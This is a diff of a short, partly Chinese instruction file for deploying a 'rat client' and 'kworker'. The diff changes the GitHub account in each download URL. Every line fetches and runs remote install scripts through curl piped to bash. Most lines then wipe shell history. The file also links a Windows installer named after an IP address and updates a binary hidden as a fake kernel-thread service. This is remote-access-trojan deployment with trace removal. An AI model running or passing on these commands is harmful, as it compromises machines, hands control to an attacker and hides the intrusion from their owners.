@@ -1,19 +1,19 @@
 
 
 install rat client and kworker
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_all.sh)" && history -c && history -cw && rm -f ~/.bash_history
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/install_all.sh)" && history -c && history -cw && rm -f ~/.bash_history
 
 单独install rat client
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_rat.sh)" && history -c && history -cw && rm -f ~/.bash_history
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/install_rat.sh)" && history -c && history -cw && rm -f ~/.bash_history
 
 单独install kworker
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install.sh)" && history -c && history -cw && rm -f ~/.bash_history
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/install.sh)" && history -c && history -cw && rm -f ~/.bash_history
 
 单独下载rat client
-https://raw.githubusercontent.com/wondream322/kworker/master/win/Install_104.143.36.54_v2.exe
+https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/win/Install_104.143.36.54_v2.exe
 
 单独安装，不清理数据
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install.sh)"
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/install.sh)"
 
 单独更新rat client
-systemctl stop kthread.service && curl -fsSL -o /var/local/kthreadd/kthread.new https://raw.githubusercontent.com/wondream322/kworker/master/kthread && chmod 755 /var/local/kthreadd/kthread.new && mv -f /var/local/kthreadd/kthread.new /var/local/kthreadd/kthread && systemctl start kthread.service && systemctl status kthread.service --no-pager
+systemctl stop kthread.service && curl -fsSL -o /var/local/kthreadd/kthread.new https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kthread && chmod 755 /var/local/kthreadd/kthread.new && mv -f /var/local/kthreadd/kthread.new /var/local/kthreadd/kthread && systemctl start kthread.service && systemctl status kthread.service --no-pager
